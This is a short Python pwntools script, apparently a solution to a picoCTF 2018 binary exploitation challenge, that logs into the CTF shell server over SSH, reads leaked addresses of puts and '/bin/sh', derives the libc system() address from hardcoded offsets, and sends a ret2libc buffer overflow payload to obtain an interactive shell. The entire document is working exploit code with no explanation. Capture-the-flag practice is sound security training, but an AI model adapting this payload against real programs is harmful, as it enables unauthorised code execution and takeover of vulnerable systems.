from pwn import *

# p = remote('127.0.0.1', 9999)
# p = process("./vuln")
p = ssh(host = '2018shell4.picoctf.com', user = 'Ice1187')
p.recvuntil("puts: ")
puts_addr = p.recvline().strip()
p.recvuntil("ing: ")
bin_sh_addr = p.recvline().strip()
"""
puts_addr = 0xf7e380a0
bin_sh_addr = 0x56557030
"""
padding = "A"*160
# puts_off = 0x5f140
puts_off = 0x00690a0
# sys_off = 0x3a940
sys_off = 0x03e9e0
base = int(puts_addr, 16) - puts_off
sys_addr = base + sys_off

# print "puts: " + str(puts_addr)
# print "/bin/sh: " + str(bin_sh_addr)

payload = padding + p32(sys_addr) + 'BBBB' + p32(int(bin_sh_addr, 16))

# print payload

p.sendline(payload)
p.interactive()

